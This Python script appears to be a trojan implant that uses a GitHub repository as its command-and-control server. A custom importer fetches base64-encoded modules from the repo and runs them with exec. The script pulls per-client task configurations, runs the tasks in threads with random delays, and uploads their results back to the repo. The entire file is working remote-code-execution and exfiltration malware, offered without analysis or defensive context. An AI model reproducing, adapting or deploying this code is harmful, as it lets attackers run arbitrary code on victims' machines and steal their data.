#!/usr/bin/env python3

import json
import base64
import sys
import time
import importlib
import random
import threading
import queue

from datetime import datetime
from github3 import login

client_id = "abc"

configured = False
task_queue = queue.Queue()

class GitImporter(object):
    def __init__(self):
        self.current_module_code = ""
    
    def find_module(self, fullname, path=None):
        if configured:
            print(f" [**] Attempting to retrieve {fullname}")
            new_library = get_file_contents(f"modules/{fullname}")         
            if new_library:
                self.current_module_code = base64.b64decode(new_library)        
                return self

    def load_module(self, name):
        repo = connect_to_github()
        spec = importlib.util.spec_from_loader(name, loader=None, origin=repo.git_url)
        mod = importlib.util.module_from_spec(spec)
        exec(self.current_module_code, mod.__dict__)
        sys.modules[spec.name] = mod
        return mod

def connect_to_github():
    with open('git_stuff.txt', 'r') as t:
        git_info = eval(t.read())
    gh = login(username=git_info['user'], token=git_info['token']) 
    repo = gh.repository( git_info['user'], git_info['repo_name'])
    return repo


def get_file_contents(filepath):
    repo = connect_to_github()
    branch = branch = repo.branch("main")
    tree = branch.commit.commit.tree.to_tree().recurse()
    
    for filename in tree.tree:      
        if filepath in filename.path:
            print(f"[+] Found file {filepath}")
            blob = repo.blob(filename._json_data["sha"])
            return blob.content
        
def get_client_config():
    global configured
    config_json = get_file_contents(f"config/{client_id}.json")
    configuration = json.loads(base64.b64decode(config_json))
    configured = True

    for tasks in configuration:
        if tasks["module"] not in sys.modules:
            exec(f"import {tasks['module']}")
    return configuration

def store_module_result(data):
    repo = connect_to_github()
    message = datetime.now().isoformat()
    remote_path = f"data/{client_id}/{message}.data"
    bindata = bytes('%r' %data, 'utf-8')
    repo.create_file(remote_path, message, base64.b64encode(bindata))
    
def module_runner(module):
    task_queue.put(1)
    result = sys.modules[module].run()
    task_queue.get()
    store_module_result(result)
    

def main():
    sys.meta_path = [GitImporter()]

    while True:
        if task_queue.empty():
            
            config = get_client_config()
            
            for task in config:
                t = threading.Thread(target=module_runner, args=(task['module'],))
                t.start()
                time.sleep(random.randint(1,10))
        # time.sleep(random.randint(10000, 60000))

if __name__=='__main__':
    main()
